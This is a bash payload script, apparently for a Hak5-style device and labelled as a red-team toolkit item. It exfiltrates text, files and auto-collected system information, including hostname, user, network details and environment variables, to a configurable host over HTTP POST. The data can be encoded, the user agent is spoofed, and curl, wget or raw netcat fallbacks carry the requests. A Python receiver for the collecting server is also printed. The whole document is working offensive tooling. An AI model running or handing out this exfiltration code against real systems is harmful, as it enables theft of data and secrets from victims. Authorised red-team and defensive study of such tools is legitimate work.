#!/bin/bash
# Title: HTTP POST Exfiltrator
# Description: Simple HTTP POST data exfiltration with encoding options
# Author: Red Team Toolkit
# Version: 1.0
# Category: exfiltration
# Net Mode: NAT
#
# LED States
# - Blue slow blink: Configuring
# - Amber: Encoding data
# - Cyan: Sending request
# - Green: Success
# - Red: Failed
#
# Use Case: Quick data exfiltration via HTTP POST
# Supports: Base64, URL encoding, raw, multipart

set -euo pipefail

# Configuration - REPLACE WITH YOUR INFRASTRUCTURE
EXFIL_URL="${EXFIL_URL:-http://example.com:8080/collect}"
USER_AGENT="${USER_AGENT:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36}"
TIMEOUT="${TIMEOUT:-30}"
ARTIFACTS_DIR="${ARTIFACTS_DIR:-/tmp/http-exfil}"

have() { command -v "$1" >/dev/null 2>&1; }

cleanup() {
  LED OFF
}
trap cleanup EXIT

url_encode() {
  local string="$1"
  local length=${#string}
  local encoded=""
  
  for (( i = 0; i < length; i++ )); do
    local c="${string:i:1}"
    case "$c" in
      [a-zA-Z0-9.~_-]) encoded+="$c" ;;
      ' ') encoded+='+' ;;
      *) encoded+=$(printf '%%%02X' "'$c") ;;
    esac
  done
  
  echo "$encoded"
}

base64_encode() {
  local data="$1"
  echo -n "$data" | base64 | tr -d '\n'
}

hex_encode() {
  local data="$1"
  echo -n "$data" | xxd -p | tr -d '\n'
}

# POST methods
post_curl() {
  local url="$1"
  local data="$2"
  local content_type="$3"
  
  curl -s -X POST \
    -H "Content-Type: $content_type" \
    -H "User-Agent: $USER_AGENT" \
    -d "$data" \
    --connect-timeout "$TIMEOUT" \
    "$url"
}

post_wget() {
  local url="$1"
  local data="$2"
  local content_type="$3"
  
  wget -q -O - \
    --header="Content-Type: $content_type" \
    --header="User-Agent: $USER_AGENT" \
    --post-data="$data" \
    --timeout="$TIMEOUT" \
    "$url" 2>/dev/null
}

post_nc() {
  local url="$1"
  local data="$2"
  local content_type="$3"
  
  # Parse URL
  local host port path
  host=$(echo "$url" | sed 's|http://||;s|https://||' | cut -d':' -f1 | cut -d'/' -f1)
  port=$(echo "$url" | sed 's|http://||;s|https://||' | cut -d':' -f2 | cut -d'/' -f1)
  path="/$(echo "$url" | sed 's|http://||;s|https://||' | cut -d'/' -f2-)"
  
  [[ "$port" == "$host" ]] && port=80
  [[ "$path" == "/" ]] && path="/collect"
  
  local content_length=${#data}
  
  {
    echo -e "POST $path HTTP/1.1\r"
    echo -e "Host: $host\r"
    echo -e "Content-Type: $content_type\r"
    echo -e "Content-Length: $content_length\r"
    echo -e "User-Agent: $USER_AGENT\r"
    echo -e "Connection: close\r"
    echo -e "\r"
    echo -n "$data"
  } | nc -w "$TIMEOUT" "$host" "$port"
}

send_post() {
  local url="$1"
  local data="$2"
  local content_type="${3:-application/x-www-form-urlencoded}"
  
  if have curl; then
    post_curl "$url" "$data" "$content_type"
    return $?
  elif have wget; then
    post_wget "$url" "$data" "$content_type"
    return $?
  elif have nc; then
    post_nc "$url" "$data" "$content_type"
    return $?
  else
    LOG red "No HTTP client available"
    return 1
  fi
}

exfil_string() {
  local data="$1"
  local encoding="$2"
  local param_name="${3:-data}"
  
  local encoded_data
  case "$encoding" in
    base64)
      encoded_data=$(base64_encode "$data")
      ;;
    url)
      encoded_data=$(url_encode "$data")
      ;;
    hex)
      encoded_data=$(hex_encode "$data")
      ;;
    raw)
      encoded_data="$data"
      ;;
    *)
      encoded_data=$(base64_encode "$data")
      ;;
  esac
  
  local post_data="${param_name}=${encoded_data}&encoding=${encoding}&timestamp=$(date +%s)"
  
  LED C SOLID
  LOG "Sending ${#data} bytes..."
  
  local response
  if response=$(send_post "$EXFIL_URL" "$post_data"); then
    LOG green "Data sent successfully"
    [[ -n "$response" ]] && LOG "Response: $response"
    return 0
  else
    LOG red "Failed to send data"
    return 1
  fi
}

exfil_file() {
  local file="$1"
  local encoding="$2"
  
  if [[ ! -f "$file" ]]; then
    LOG red "File not found: $file"
    return 1
  fi
  
  local filename
  filename=$(basename "$file")
  local file_size
  file_size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file")
  
  LOG "File: $filename ($file_size bytes)"
  
  local file_data
  file_data=$(cat "$file")
  
  local encoded_data
  case "$encoding" in
    base64)
      encoded_data=$(base64 < "$file" | tr -d '\n')
      ;;
    hex)
      encoded_data=$(xxd -p < "$file" | tr -d '\n')
      ;;
    raw)
      encoded_data="$file_data"
      ;;
    *)
      encoded_data=$(base64 < "$file" | tr -d '\n')
      ;;
  esac
  
  local post_data="filename=$(url_encode "$filename")&data=${encoded_data}&encoding=${encoding}&size=${file_size}&timestamp=$(date +%s)"
  
  LED C SOLID
  LOG "Sending file..."
  
  local response
  if response=$(send_post "$EXFIL_URL" "$post_data"); then
    LOG green "File sent successfully"
    [[ -n "$response" ]] && LOG "Response: $response"
    return 0
  else
    LOG red "Failed to send file"
    return 1
  fi
}

exfil_multipart() {
  local file="$1"
  
  if [[ ! -f "$file" ]]; then
    LOG red "File not found: $file"
    return 1
  fi
  
  local filename
  filename=$(basename "$file")
  
  if have curl; then
    LED C SOLID
    LOG "Sending multipart..."
    
    if curl -s -X POST \
        -H "User-Agent: $USER_AGENT" \
        -F "file=@${file}" \
        -F "timestamp=$(date +%s)" \
        --connect-timeout "$TIMEOUT" \
        "$EXFIL_URL" >/dev/null; then
      LOG green "File sent successfully"
      return 0
    else
      LOG red "Failed to send file"
      return 1
    fi
  else
    LOG red "Multipart requires curl"
    return 1
  fi
}

collect_system_info() {
  {
    echo "=== System Info ==="
    echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
    echo "User: $(whoami 2>/dev/null || echo unknown)"
    echo "Date: $(date)"
    echo "Uptime: $(uptime 2>/dev/null || echo unknown)"
    echo ""
    echo "=== Network ==="
    ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "No network info"
    echo ""
    echo "=== Environment ==="
    env 2>/dev/null | head -50
  }
}

show_receiver_info() {
  LOG ""
  LOG blue "=== Simple HTTP Receiver ==="
  LOG ""
  LOG "Python one-liner receiver:"
  LOG "python3 -c '"
  LOG "from http.server import HTTPServer, BaseHTTPRequestHandler"
  LOG "import urllib.parse, base64"
  LOG "class H(BaseHTTPRequestHandler):"
  LOG "    def do_POST(self):"
  LOG "        length = int(self.headers[\"Content-Length\"])"
  LOG "        data = self.rfile.read(length).decode()"
  LOG "        params = urllib.parse.parse_qs(data)"
  LOG "        if \"data\" in params:"
  LOG "            decoded = base64.b64decode(params[\"data\"][0])"
  LOG "            print(decoded.decode())"
  LOG "        self.send_response(200)"
  LOG "        self.end_headers()"
  LOG "HTTPServer((\"\", 8080), H).serve_forever()'"
  LOG ""
}

main() {
  LOG blue "=== HTTP POST Exfiltrator ==="
  LOG "Quick data exfil via HTTP POST"
  LOG ""
  
  mkdir -p "$ARTIFACTS_DIR"
  
  LED B SLOW
  
  # Check for HTTP tools
  local tool=""
  have curl && tool="curl"
  have wget && tool="wget"
  have nc && tool="nc"
  
  if [[ -z "$tool" ]]; then
    ERROR_DIALOG "No HTTP tools available (curl/wget/nc)"
    exit 1
  fi
  
  LOG "Using: $tool"
  LOG ""
  
  # Configure URL
  local url
  url=$(TEXT_PICKER "Exfil URL" "$EXFIL_URL") || true
  case $? in
    "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR")
      LOG "Cancelled"; exit 1 ;;
  esac
  [[ -n "$url" ]] && EXFIL_URL="$url"
  
  LOG "URL: $EXFIL_URL"
  LOG ""
  
  # Select mode
  LOG "Exfil mode:"
  LOG "1. String/text data"
  LOG "2. File (encoded)"
  LOG "3. File (multipart)"
  LOG "4. System info auto-collect"
  LOG ""
  
  local mode
  mode=$(NUMBER_PICKER "Mode (1-4)" 1) || true
  
  # Select encoding
  local encoding="base64"
  if [[ "$mode" != "3" && "$mode" != "4" ]]; then
    LOG ""
    LOG "Encoding:"
    LOG "1. Base64"
    LOG "2. URL encode"
    LOG "3. Hex"
    LOG "4. Raw"
    LOG ""
    
    local enc_num
    enc_num=$(NUMBER_PICKER "Encoding (1-4)" 1) || true
    case "$enc_num" in
      1) encoding="base64" ;;
      2) encoding="url" ;;
      3) encoding="hex" ;;
      4) encoding="raw" ;;
    esac
  fi
  
  LED Y SOLID
  
  case "$mode" in
    1)  # String
      local data
      data=$(TEXT_PICKER "Data to exfil" "") || true
      [[ -z "$data" ]] && { LOG "Cancelled"; exit 1; }
      
      exfil_string "$data" "$encoding"
      ;;
      
    2)  # File encoded
      local file
      file=$(TEXT_PICKER "File path" "/tmp/data.txt") || true
      [[ -z "$file" ]] && { LOG "Cancelled"; exit 1; }
      
      exfil_file "$file" "$encoding"
      ;;
      
    3)  # Multipart
      local file
      file=$(TEXT_PICKER "File path" "/tmp/data.txt") || true
      [[ -z "$file" ]] && { LOG "Cancelled"; exit 1; }
      
      exfil_multipart "$file"
      ;;
      
    4)  # System info
      LOG "Collecting system info..."
      local sys_info
      sys_info=$(collect_system_info)
      
      exfil_string "$sys_info" "base64" "sysinfo"
      ;;
  esac
  
  if [[ $? -eq 0 ]]; then
    LED G SOLID
    VIBRATE
  else
    LED R SOLID
  fi
  
  # Log attempt
  {
    echo "=== HTTP Exfil Log ==="
    echo "Time: $(date)"
    echo "URL: $EXFIL_URL"
    echo "Mode: $mode"
    echo "Encoding: $encoding"
    echo "Tool: $tool"
  } >> "$ARTIFACTS_DIR/exfil_log.txt"
  
  show_receiver_info
  
  PROMPT "Press button to exit"
}

main "$@"
